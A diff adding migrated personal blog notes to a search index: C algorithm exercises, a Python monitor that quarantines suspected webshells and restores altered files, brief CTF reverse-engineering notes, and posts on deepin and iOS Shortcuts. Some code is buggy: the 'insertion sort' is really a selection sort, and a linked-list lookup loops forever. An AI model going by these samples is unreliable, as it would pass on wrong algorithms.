@@ -53,7 +53,7 @@
 <ul>
 <li>开源：Python编写，易于和基于python的主机防御框架集成。</li>
 <li>支持多平台：Windows，Mac，Linux全支持</li>
-<li>易于扩展：通过插件来扩展Volatility的分析能力<h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址#"></a>项目地址<a href="https://wiki.wgpsec.org/knowledge/ctf/Volatility.html#%E9%A1%B9%E7%9B%AE%E5%9C%B0%E5%9D%80">#</a></h3>&lt;–more–&gt;<br><a href="https://github.com/volatilityfoundation/volatility">https://github.com/volatilityfoundation/volatility</a></li>
+<li>易于扩展：通过插件来扩展Volatility的分析能力<h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址#"></a>项目地址<a href="https://wiki.wgpsec.org/knowledge/ctf/Volatility.html#%E9%A1%B9%E7%9B%AE%E5%9C%B0%E5%9D%80">#</a></h3>&lt;—more—&gt;<br><a href="https://github.com/volatilityfoundation/volatility">https://github.com/volatilityfoundation/volatility</a></li>
 </ul>
 <h3 id="Kali安装"><a href="#Kali安装" class="headerlink" title="Kali安装#"></a>Kali安装<a href="https://wiki.wgpsec.org/knowledge/ctf/Volatility.html#kali%E5%AE%89%E8%A3%85">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install volatility</span><br><span class="line">volatility -h</span><br><span class="line"># 部分报错可能kali版本过低</span><br></pre></td></tr></table></figure>
 <h3 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块#"></a>常用模块<a href="https://wiki.wgpsec.org/knowledge/ctf/Volatility.html#%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97">#</a></h3><table>
@@ -740,6 +740,1458 @@
       <tags>
         <tag>MISC</tag>
         <tag>forensic</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>算法（一） 枚举法</title>
+    <url>/2019/03/11/cnblog_10513965/</url>
+    <content><![CDATA[<h1 id="这是👉算法（一）-枚举法👈的摘要"><a href="#这是👉算法（一）-枚举法👈的摘要" class="headerlink" title="这是👉算法（一） 枚举法👈的摘要"></a><a href="../../../../2019/03/11/cnblog_10513965/">这是👉算法（一） 枚举法👈的摘要</a></h1><a id="more"></a>
+
+
+<p>枚举法，暴力破解，直接罗列各种情况。</p>
+<p>例1</p>
+<p>题目描述：</p>
+<p>古堡算式福尔摩斯到某古堡探险，看到门上写着一个奇怪的算式：<br>ABCDE * ? = EDCBA<br>他对华生说：”ABCDE 应该代表不同的数字，问号也代表某个数字！”<br>华生：”我猜也是！”<br>于是，两人沉默了好久，还是没有算出合适的结果来。请你利用计算机的优势，找到破解的答案。<br>把 ABCDE 所代表的数字写出来。</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+#include&lt;string.h&gt;
+
+int main()
+
+&#123;
+
+    int a,b,c,d,e,x;
+
+    for(a=0; a&lt;=9; a++)
+
+        for(b=0; b&lt;=9; b++)
+
+            for(c=0; c&lt;=9; c++)
+
+                for(d=0; d&lt;=9; d++)
+
+                    for(e=0; e&lt;=9; e++)
+
+                        for(x=0; x&lt;=9; x++)
+
+                            if(a!=b&amp;&amp;a!=c&amp;&amp;a!=d&amp;&amp;a!=e&amp;&amp;b!=c&amp;&amp;b!=d&amp;&amp;b!=e&amp;&amp;c!=d&amp;&amp;c!=e&amp;&amp;d!=e)
+
+                                if((a*10000+b*1000+c*100+d*10+e)*x==e*10000+d*1000+c*100+b*10+a)
+
+                                    printf(&quot;%d%d%d%d%d&quot;,a,b,c,d,e);
+
+    return 0;
+
+&#125;</code></pre>
+<p>例二</p>
+<p>三羊生瑞气</p>
+<p>观察一下加法算式，一个汉字代表一个数字,求三羊献瑞代表的数字。</p>
+<pre><code>   祥 瑞 生 辉  </code></pre>
+<p>  +   三 羊 献 瑞<br>-——————<br>   三 羊 生 瑞 气</p>
+<pre><code>#include&lt;stdio.h&gt; 
+
+int main()
+&#123;
+    int a,b,c,d,f,g,h;
+    int num1,num2,sum;
+    for(a=2;a&lt;=9;a++)
+        for(b=0;b&lt;=9;b++)
+            for(c=0;c&lt;=9;c++)
+                for(d=0;d&lt;=9;d++)    
+                    for(f=0;f&lt;=9;f++)
+                        for(g=0;g&lt;=9;g++)
+                            for(h=0;h&lt;=9;h++)
+                                if(a!=b &amp;&amp; a!=c &amp;&amp; a!=d &amp;&amp; a!=f &amp;&amp; a!=g &amp;&amp; a!=h
+                                &amp;&amp; b!=c &amp;&amp; b!=d &amp;&amp; b!=f &amp;&amp; b!= g &amp;&amp;b!=h
+                                &amp;&amp; c!=d &amp;&amp; c!=f &amp;&amp; c!= g &amp;&amp; c!=h
+                                &amp;&amp; d!=f &amp;&amp; d!=g &amp;&amp;d!=h
+                                &amp;&amp; f!=g &amp;&amp; f!=h
+                                &amp;&amp; g!=h
+                                &amp;&amp; a!=1 &amp;&amp; b!=1 &amp;&amp; c!=1 &amp;&amp; d!=1 &amp;&amp; f!=1 &amp;&amp; g!=1 &amp;&amp; h!=1)
+                                &#123;
+                                    num1=a*1000 + b*100 + c*10 + d;
+                                    num2=1*1000 + f*100 + g*10 + b;
+                                    sum=1*10000 + f*1000 + c*100 + b*10 + h;
+                                    if(sum==(num1 + num2))
+                                    &#123;
+                                        printf(&quot;1%d%d%d&quot;,f,g,b);
+                                    &#125;                        
+
+                                &#125;
+    return 0;
+&#125; </code></pre>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>判断闰年</title>
+    <url>/2019/03/05/cnblog_10478098/</url>
+    <content><![CDATA[<h1 id="这是👉判断闰年👈的摘要"><a href="#这是👉判断闰年👈的摘要" class="headerlink" title="这是👉判断闰年👈的摘要"></a><a href="../../../../2019/03/05/cnblog_10478098/">这是👉判断闰年👈的摘要</a></h1><a id="more"></a>
+<p><img src="https://img2018.cnblogs.com/blog/1619455/201903/1619455-20190305171008247-102369468.png"></p>
+<p>c语言代码实现如下：</p>
+<p>#include &lt;stdio.h&gt;<br>int main() {<br>    int year;<br>    scanf(“%d”, &amp;year);<br>    if((year % 100 !=0 &amp;&amp; year % 4 == 0) || year % 400 ==0){<br>       printf(“YES”);<br>    }else{<br>        printf(“NO”);<br>    }<br>    return 0;<br>}</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>算法--排序</title>
+    <url>/2019/03/12/cnblog_10515964/</url>
+    <content><![CDATA[<h1 id="这是👉算法–排序👈的摘要"><a href="#这是👉算法–排序👈的摘要" class="headerlink" title="这是👉算法–排序👈的摘要"></a><a href="../../../../2019/03/12/cnblog_10515964/">这是👉算法–排序👈的摘要</a></h1><a id="more"></a>
+<p>1 冒泡排序</p>
+<pre><code> 1 #include&lt;stdio.h&gt;
+ 2 int main()&#123;
+ 3     int n,t;
+ 4     scanf(&quot;%d&quot;,&amp;n); //n排序总数 
+ 5     int arr[n];
+ 6     for(int i=0;i&lt;n;i++)
+ 7         scanf(&quot;%d&quot;,&amp;arr[i]);  //输入 
+ 8     for(int i=0;i&lt;n-1;i++)&#123;  //开始排序 
+ 9         for(int j=0;j&lt;n-i-1;j++)&#123;
+10             if(arr[j]&gt;arr[j+1])&#123;    
+11             t=arr[j];
+12             arr[j]=arr[j+1];
+13             arr[j+1]=t;
+14         &#125;
+15     &#125;
+16 &#125;
+17     for(int i=0;i&lt;n;i++)
+18         printf(&quot;%d &quot;,arr[i]);  //输出 
+19         return 0;
+20 &#125; </code></pre>
+<p>2 选择排序</p>
+<pre><code>#include&lt;stdio.h&gt;
+int main()&#123;
+    int n,t;
+    scanf(&quot;%d&quot;,&amp;n); //n排序总数 
+    int arr[n];
+    for(int i=0;i&lt;n;i++)
+        scanf(&quot;%d&quot;,&amp;arr[i]);  //输入 
+    for(int i=0;i&lt;n;i++)&#123;  //开始排序 
+        for(int j=i+1;j&lt;n;j++)&#123;
+            if(arr[i]&gt;arr[j])&#123;    
+            t=arr[i];
+            arr[i]=arr[j];
+            arr[j]=t;
+        &#125;
+    &#125;
+&#125;
+    for(int i=0;i&lt;n;i++)
+        printf(&quot;%d &quot;,arr[i]);  //输出 
+        return 0;
+&#125; </code></pre>
+<p>3 插入排序</p>
+<pre><code>#include&lt;stdio.h&gt;
+int main()&#123;
+    int n,t;
+    scanf(&quot;%d&quot;,&amp;n); //n排序总数 
+    int arr[n];
+    for(int i=0;i&lt;n;i++)
+        scanf(&quot;%d&quot;,&amp;arr[i]);  //输入 
+    for(int i=0;i&lt;n;i++)&#123;  //开始排序 
+        for(int j=i+1;j&lt;n;j++)&#123;
+            if(arr[i]&gt;arr[j])&#123;    
+            t=arr[i];
+            arr[i]=arr[j];
+            arr[j]=t;
+        &#125;
+    &#125;
+&#125;
+    for(int i=0;i&lt;n;i++)
+        printf(&quot;%d &quot;,arr[i]);  //输出 
+        return 0;
+&#125; </code></pre>
+<p>4 堆排序</p>
+<p>5 归并排序</p>
+<p>6 快速排序</p>
+<pre><code>#include &lt;stdio.h&gt;
+void swap(int a[], int i, int j)
+&#123;
+    int t = a[i];
+    a[i] = a[j];
+    a[j] = t;
+&#125;
+
+int partition(int a[], int p, int r)
+&#123;
+    int i = p;
+    int j = r + 1;
+    int x = a[p];
+    while(1)&#123;
+        while(i&lt;r &amp;&amp; a[++i]&lt;x);
+        while(a[--j]&gt;x);
+        if(i&gt;=j) break;
+        swap(a,i,j);
+    &#125;
+    swap(a,p,j);
+
+    return j;
+&#125;
+
+void quicksort(int a[], int p, int r)  
+&#123;
+    if(p&lt;r)&#123;
+        int q = partition(a,p,r);
+        quicksort(a,p,q-1);
+        quicksort(a,q+1,r);
+    &#125;
+&#125;
+
+int main()
+&#123;
+    int i;
+    int a[] = &#123;5,13,6,24,2,8,19,27,6,12,1,17&#125;;
+    int N = 12;
+
+    quicksort(a, 0, N-1);
+
+    for(i=0; i&lt;N; i++) printf(&quot;%d &quot;, a[i]);
+    printf(&quot;\n&quot;);
+
+    return 0;
+&#125;</code></pre>
+<p>这个我无良的直接复制过来了。。。</p>
+<p>我就先 列出来。。。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>算法——动态规划</title>
+    <url>/2019/03/12/cnblog_10515988/</url>
+    <content><![CDATA[<h1 id="这是👉算法——动态规划👈的摘要"><a href="#这是👉算法——动态规划👈的摘要" class="headerlink" title="这是👉算法——动态规划👈的摘要"></a><a href="../../../../2019/03/12/cnblog_10515988/">这是👉算法——动态规划👈的摘要</a></h1><a id="more"></a>
+
+
+
+
+<p>1 数塔问题</p>
+<p><img src="https://img2018.cnblogs.com/blog/1619455/201903/1619455-20190312214858768-1484119175.png"></p>
+<p>找出一条最大的路径(图片来自百度）</p>
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+
+int main()&#123;
+    int n;
+    scanf(&quot;%d&quot;,&amp;n);
+    int arr[50][50];
+    memset(arr, 0, sizeof(arr));
+    int i,j=1;
+    for(i=1;i&lt;=n;i++) 
+        for(j=1;j&lt;=i;j++)
+            scanf(&quot;%d&quot;,&amp;arr[i][j]);
+
+    for(i=1;i&lt;=n;i++)&#123;
+        for(j=1;j&lt;=n;j++)
+        if(arr[i-1][j-1]&gt;=arr[i-1][j])&#123;
+            arr[i][j]+=arr[i-1][j-1];
+        &#125;
+        else arr[i][j]+=arr[i-1][j];
+    &#125;
+    int m=0;
+    for(j=1;j&lt;=n;j++)
+        if(arr[n][j]&gt;m)
+            m=arr[n][j];
+    printf(&quot;%d&quot;,m);
+    return 0;
+&#125; </code></pre>
+<p>2 LIS 最大上升子数列</p>
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+int main()&#123;
+    int n,t=0;
+    scanf(&quot;%d&quot;,&amp;n);
+    int arr[n];
+    int arr1[n];
+    memset(arr1,0,sizeof(arr1));
+    for(int i=0;i&lt;n;i++)
+        scanf(&quot;%d&quot;,&amp;arr[i]);  
+    for(int i=0;i&lt;n;i++)&#123;
+        arr1[i]=1;
+        for(int j=0;j&lt;i;j++)
+            if(arr[i]&gt;arr[j])
+                if((arr1[j]+1)&gt;arr1[i])
+                    arr1[i]=arr1[j]+1;
+    &#125;
+    for(int i=0;i&lt;n;i++)
+        if(arr1[i]&gt;t) t=arr1[i];
+    printf(&quot;%d&quot;,t);
+    return 0;
+    &#125;</code></pre>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>魔术</title>
+    <url>/2019/04/02/cnblog_10645474/</url>
+    <content><![CDATA[<h1 id="这是👉魔术👈的摘要"><a href="#这是👉魔术👈的摘要" class="headerlink" title="这是👉魔术👈的摘要"></a><a href="../../../../2019/04/02/cnblog_10645474/">这是👉魔术👈的摘要</a></h1><a id="more"></a>
+<p>魔术</p>
+<p>通过 随机数 字符型 实现</p>
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;time.h&gt;
+#include&lt;string.h&gt;
+
+int main()&#123;
+    int i;
+    char c,gu;
+    srand((unsigned)time(NULL));
+    c=6;
+    gu=rand()%6+1;
+    for(i=1;i&lt;=100;i++)&#123;
+        c=rand()%31+1;
+        if(c&gt;=7&amp;&amp;c&lt;=13) c=17;
+        if(i%9==0)
+            printf(&quot;%d.%c\t&quot;,i,gu);
+        else printf(&quot;%d.%c\t&quot;,i,c);
+        if(i%5==0) printf(&quot;\n&quot;);
+    &#125;
+    getchar();
+    printf(&quot;the icon you guess is :\n&quot;);
+    for(i=1;i&lt;=10;i++) printf(&quot;%c&quot;,gu);
+    printf(&quot;\n&quot;); 
+&#125;</code></pre>
+<p><img src="https://img2018.cnblogs.com/blog/1619455/201904/1619455-20190402212723277-1379852152.png"></p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件检测</title>
+    <url>/2019/06/11/cnblog_11001628/</url>
+    <content><![CDATA[<h1 id="这是👉文件检测👈的摘要"><a href="#这是👉文件检测👈的摘要" class="headerlink" title="这是👉文件检测👈的摘要"></a><a href="../../../../2019/06/11/cnblog_11001628/">这是👉文件检测👈的摘要</a></h1><a id="more"></a>
+
+<pre><code># -*- coding: utf-8 -*-
+#use: python file_check.py ./
+
+import os
+import hashlib
+import shutil
+import ntpath
+import time
+
+CWD = os.getcwd()
+FILE_MD5_DICT = &#123;&#125;      # 文件MD5字典
+ORIGIN_FILE_LIST = []
+
+# 特殊文件路径字符串
+Special_path_str = &#39;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#39;
+bakstring = &#39;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#39;
+logstring = &#39;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;
+webshellstring = &#39;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;
+difffile = &#39;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#39;
+
+Special_string = &#39;drops_log&#39;  # 免死金牌
+UNICODE_ENCODING = &quot;utf-8&quot;
+INVALID_UNICODE_CHAR_FORMAT = r&quot;\?%02x&quot;
+
+# 文件路径字典
+spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))
+Special_path = &#123;
+    &#39;bak&#39; : os.path.realpath(os.path.join(spec_base_path, bakstring)),
+    &#39;log&#39; : os.path.realpath(os.path.join(spec_base_path, logstring)),
+    &#39;webshell&#39; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),
+    &#39;difffile&#39; : os.path.realpath(os.path.join(spec_base_path, difffile)),
+&#125;
+
+def isListLike(value):
+    return isinstance(value, (list, tuple, set))
+
+# 获取Unicode编码
+def getUnicode(value, encoding=None, noneToNull=False):
+
+    if noneToNull and value is None:
+        return NULL
+
+    if isListLike(value):
+        value = list(getUnicode(_, encoding, noneToNull) for _ in value)
+        return value
+
+    if isinstance(value, unicode):
+        return value
+    elif isinstance(value, basestring):
+        while True:
+            try:
+                return unicode(value, encoding or UNICODE_ENCODING)
+            except UnicodeDecodeError, ex:
+                try:
+                    return unicode(value, UNICODE_ENCODING)
+                except:
+                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]
+    else:
+        try:
+            return unicode(value)
+        except UnicodeDecodeError:
+            return unicode(str(value), errors=&quot;ignore&quot;)
+
+# 目录创建
+def mkdir_p(path):
+    import errno
+    try:
+        os.makedirs(path)
+    except OSError as exc:
+        if exc.errno == errno.EEXIST and os.path.isdir(path):
+            pass
+        else: raise
+
+# 获取当前所有文件路径
+def getfilelist(cwd):
+    filelist = []
+    for root,subdirs, files in os.walk(cwd):
+        for filepath in files:
+            originalfile = os.path.join(root, filepath)
+            if Special_path_str not in originalfile:
+                filelist.append(originalfile)
+    return filelist
+
+# 计算机文件MD5值
+def calcMD5(filepath):
+    try:
+        with open(filepath,&#39;rb&#39;) as f:
+            md5obj = hashlib.md5()
+            md5obj.update(f.read())
+            hash = md5obj.hexdigest()
+            return hash
+    except Exception, e:
+        print u&#39;[!] getmd5_error : &#39; + getUnicode(filepath)
+        print getUnicode(e)
+        try:
+            ORIGIN_FILE_LIST.remove(filepath)
+            FILE_MD5_DICT.pop(filepath, None)
+        except KeyError, e:
+            pass
+
+# 获取所有文件MD5
+def getfilemd5dict(filelist = []):
+    filemd5dict = &#123;&#125;
+    for ori_file in filelist:
+        if Special_path_str not in ori_file:
+            md5 = calcMD5(os.path.realpath(ori_file))
+            if md5:
+                filemd5dict[ori_file] = md5
+    return filemd5dict
+
+# 备份所有文件
+def backup_file(filelist=[]):
+    # if len(os.listdir(Special_path[&#39;bak&#39;])) == 0:
+    for filepath in filelist:
+        if Special_path_str not in filepath:
+            shutil.copy2(filepath, Special_path[&#39;bak&#39;])
+
+if __name__ == &#39;__main__&#39;:
+    print u&#39;---------start------------&#39;
+    for value in Special_path:
+        mkdir_p(Special_path[value])
+    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件
+    ORIGIN_FILE_LIST = getfilelist(CWD)
+    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)
+    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG
+    print u&#39;[*] pre work end!&#39;
+    while True:
+        file_list = getfilelist(CWD)
+        # 移除新上传文件
+        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))
+        if len(diff_file_list) != 0:
+            # import pdb;pdb.set_trace()
+            for filepath in diff_file_list:
+                try:
+                    f = open(filepath, &#39;r&#39;).read()
+                except Exception, e:
+                    break
+                if Special_string not in f:
+                    try:
+                        print u&#39;[*] webshell find : &#39; + getUnicode(filepath)
+                        shutil.move(filepath, os.path.join(Special_path[&#39;webshell&#39;], ntpath.basename(filepath) + &#39;.txt&#39;))
+                    except Exception as e:
+                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filepath)
+                    try:
+                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)
+                        f.write(&#39;newfile: &#39; + getUnicode(filepath) + &#39; : &#39; + str(time.ctime()) + &#39;\n&#39;)
+                        f.close()
+                    except Exception as e:
+                        print u&#39;[-] log error : file move error: &#39; + getUnicode(e)
+
+        # 防止任意文件被修改,还原被修改文件
+        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)
+        for filekey in md5_dict:
+            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:
+                try:
+                    f = open(filekey, &#39;r&#39;).read()
+                except Exception, e:
+                    break
+                if Special_string not in f:
+                    try:
+                        print u&#39;[*] file had be change : &#39; + getUnicode(filekey)
+                        shutil.move(filekey, os.path.join(Special_path[&#39;difffile&#39;], ntpath.basename(filekey) + &#39;.txt&#39;))
+                        shutil.move(os.path.join(Special_path[&#39;bak&#39;], ntpath.basename(filekey)), filekey)
+                    except Exception as e:
+                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filekey)
+                    try:
+                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)
+                        f.write(&#39;diff_file: &#39; + getUnicode(filekey) + &#39; : &#39; + getUnicode(time.ctime()) + &#39;\n&#39;)
+                        f.close()
+                    except Exception as e:
+                        print u&#39;[-] log error : done_diff: &#39; + getUnicode(filekey)
+                        pass
+        time.sleep(2)
+        # print &#39;[*] &#39; + getUnicode(time.ctime())
+
+作者：Mr_Shadowalker
+链接：https://www.jianshu.com/p/25535f0b98d4
+來源：简书
+简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。</code></pre>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bugku ctf 逆向题</title>
+    <url>/2019/05/16/cnblog_10875920/</url>
+    <content><![CDATA[<h1 id="这是👉bugku-ctf-逆向题👈的摘要"><a href="#这是👉bugku-ctf-逆向题👈的摘要" class="headerlink" title="这是👉bugku ctf 逆向题👈的摘要"></a><a href="../../../../2019/05/16/cnblog_10875920/">这是👉bugku ctf 逆向题👈的摘要</a></h1><a id="more"></a>
+<p>1.逆向入门</p>
+<p><img src="https://img2018.cnblogs.com/blog/1619455/201905/1619455-20190518104126835-507743099.png"></p>
+<p>2.Easy_vb</p>
+<p>直接找出来。</p>
+<p><img src="https://img2018.cnblogs.com/blog/1619455/201905/1619455-20190516151507043-1952365141.png"></p>
+<p>3.easy_re</p>
+<p><img src="https://img2018.cnblogs.com/blog/1619455/201905/1619455-20190520140107490-694324659.png"></p>
+<p>4.游戏过关</p>
+<p>摁着嗯着就出来了。。。</p>
+<p>5.Timer{阿里ctf}</p>
+<p>apk文件，不会搞。</p>
+<p>6.逆向入门</p>
+<p>发现是base64，直接转图片</p>
+<p><img src="https://img2018.cnblogs.com/blog/1619455/201905/1619455-20190520140212958-1627325468.png"></p>
+<p>7.love</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>在ｓｄ卡中安装ｄｅｅｐｉｎ系统</title>
+    <url>/2019/06/17/cnblog_11039032/</url>
+    <content><![CDATA[<h1 id="这是👉在sd卡中安装deepin系统👈的摘要"><a href="#这是👉在sd卡中安装deepin系统👈的摘要" class="headerlink" title="这是👉在ｓｄ卡中安装ｄｅｅｐｉｎ系统👈的摘要"></a><a href="../../../../2019/06/17/cnblog_11039032/">这是👉在ｓｄ卡中安装ｄｅｅｐｉｎ系统👈的摘要</a></h1><a id="more"></a>
+<p>在ｓｄ卡中安装ｄｅｅｐｉｎ系统</p>
+<p>１．关于在Ｓｄ卡中安装系统的教程比较少，博主基本按照在ｕ盘中安装系统的教程安装，已经成功安装并使用。在安装过程中也发现不少问题，具体优缺点会在本文末尾说明。</p>
+<p>２．大体思路就是使用ｄｅｅｐｉｎ的启动盘制作工具，在一个ｕ盘中制作启动盘，再将系统安装在ｓｄ卡中。其中遇到一个小问题，就是ｕ盘插口与ｕ盘ｕｓｂ接口版本要一致，博主第一次没有成功，无奈又借了一个ｕｓｂ３．０的ｕ盘＝＝，成功安装，注意要将ｓｄ卡的写保护开关关一下。。。泪的教训</p>
+<p>３．系统安装成功后，刚开始没有找到ｇrub引导，无法进入系统。换成读卡器读卡后成功进入系统，但是之后ｓｄ卡直接插卡槽也成功了。没有搞懂是为什么，也不清楚是什么问题。。。</p>
+<p>４．至此系统就可以正常使用了，发现一些问题也并无大碍，百度基本也都解决了。</p>
+<p><img src="https://img2018.cnblogs.com/blog/1619455/201906/1619455-20190617120527237-863418913.png"></p>
+<p>界面还是比较好看的。</p>
+<p>接下来说一下ｓｄ卡装系统的优缺点。</p>
+<p>１，最主要的，方便。许多电脑都是有ｓｄ卡卡槽的，弄个系统直接塞里面还是非常舒服的。而且也很便携。</p>
+<p><img src="https://img2018.cnblogs.com/blog/1619455/201906/1619455-20190617120851638-1037400999.jpg"></p>
+<p>这可能是我最大的败笔了。。。</p>
+<p>２．接下啦是一个十分致命的缺点，并不是所有电脑都能启动的了，大概是因为ｓｄ卡需要驱动。博主用同学电脑做了一些测试，结果如下：</p>
+<p>除了博主自己装机电脑，剩下的ｄｅｌｌ都不行，根本找不到启动项，具体我的为什么能行＝＝，我这里直接有一个启动项就是ｄｅｅｐｉｎ，别人的都是ＵＥＦＩ。学校的联想台式机成功，具体硬件没细看。ｔｈｉｎｋｐａｄ，有保护，懒得弄了。小米笔记本，成功。机械师，有启动项，但是启动后不兼容２０６０显卡。光影精灵，没成功。</p>
+<p>所以说，如果自己使用的话，可以试试，注意卡槽＝＝。如果要便携并且频繁换设备的话就不建议了。</p>
+<p>本人小白，非喜勿喷，欢迎一起讨论。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ios快捷指令编程尝试</title>
+    <url>/2020/03/02/cnblog_12395416/</url>
+    <content><![CDATA[<h1 id="这是👉ios快捷指令编程尝试👈的摘要"><a href="#这是👉ios快捷指令编程尝试👈的摘要" class="headerlink" title="这是👉ios快捷指令编程尝试👈的摘要"></a><a href="../../../../2020/03/02/cnblog_12395416/">这是👉ios快捷指令编程尝试👈的摘要</a></h1><a id="more"></a>
+<p>最近，，，啊好几个月了，发现这个ios的快捷指令很好玩</p>
+<p>原生就提供了不少功能</p>
+<p>用来练习编程思维是十分有用啊。。。）</p>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200302140601174-724432380.png"></p>
+<p>其次呢，还可以使用外接的功能对原有的功能进行拓展，比如api借口啊，ssh执行程序啊，之类的</p>
+<p>之前呢，就找到了一个每天播报信息的指令，早上当作闹铃使用，又自己写了一点，自动给女朋友发信息emmm</p>
+<p>今天突发奇想，想尝试做一个小爬虫，先拿自己的ftp服务器尝试了一下，过程有点费劲，这官方文档介绍太简洁了。。</p>
+<pre><code>https://support.apple.com/zh-cn/guide/shortcuts/apdf22b0444c/ios</code></pre>
+<p><img src="https://img2020.cnblogs.com/i-beta/1619455/202003/1619455-20200302141433281-354796698.png"></p>
+<p> 但是呢，最终20个操作就成功完成了二级目录爬图片的操作。</p>
+<p>这个使用ipad操作呢，，还是有点不熟练，感觉影响速度。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>实验一</title>
+    <url>/2019/10/29/cnblog_11757548/</url>
+    <content><![CDATA[<h1 id="这是👉实验一👈的摘要"><a href="#这是👉实验一👈的摘要" class="headerlink" title="这是👉实验一👈的摘要"></a><a href="../../../../2019/10/29/cnblog_11757548/">这是👉实验一👈的摘要</a></h1><a id="more"></a>
+<p>#include&lt;stdio.h&gt;<br>#include&lt;stdlib.h&gt;  </p>
+<p>typedef struct Node{<br>    int index;<br>    int ss;<br>    int xs;<br>    struct Node *next;<br>}Node, *Linkedlist;  </p>
+<p>Linkedlist complex_output(int p,int q){<br>    if(q&gt;0){<br>        printf(“%d+%di\n”,p,q);<br>    }<br>    else if(q&lt;0)<br>        printf(“%d%di\n”,p,q);<br>    else<br>        printf(“%d\n”,p);<br>    return 0;<br>}<br>Linkedlist insert(Linkedlist head,Node *node){<br>    node-&gt;next=head;<br>    head=node;<br>    return head;<br>}  </p>
+<p>void output(){<br>    printf(“———————————–\n”);<br>    printf(“              实验                 \n”);<br>    printf(“———————————–\n”);<br>    printf(“1.输入复数\n”);<br>    printf(“2.复数求和\n”);<br>    printf(“3.复数求差\n”);<br>    printf(“4.复数求积\n”);<br>    printf(“5.分离实部\n”);<br>    printf(“6.分离虚部\n”);<br>    printf(“———————————–\n”);<br>}  </p>
+<p>void link_output(Linkedlist head){<br>    Node *current_node = head;<br>    while(current_node!=NULL){<br>        //printf(“%d.%d+%di”,current_node-&gt;index,current_node-&gt;ss,current_node-&gt;xs);<br>        printf(“%d. “,current_node-&gt;index);<br>        complex_output(current_node-&gt;ss,current_node-&gt;xs);<br>        current_node=current_node-&gt;next;<br>    }<br>}  </p>
+<p>Linkedlist find_index(Linkedlist head,int p){<br>    Node *current_node=head;<br>    Node *a=NULL;<br>    while(current_node!=NULL){<br>        if (current_node-&gt;index==p){<br>            a=current_node;<br>            return a;<br>            break;<br>        }<br>    }<br>}<br>void add(Linkedlist head,int p,int q){<br>    Linkedlist a = find_index(head,p);<br>    Linkedlist b = find_index(head,q);<br>    complex_output(a-&gt;ss+b-&gt;ss,a-&gt;xs+b-&gt;xs);<br>}  </p>
+<p>void sub(Linkedlist head,int p,int q){<br>    Linkedlist a = find_index(head,p);<br>    Linkedlist b = find_index(head,q);<br>    complex_output(a-&gt;ss-b-&gt;ss,a-&gt;xs-b-&gt;xs);<br>}  </p>
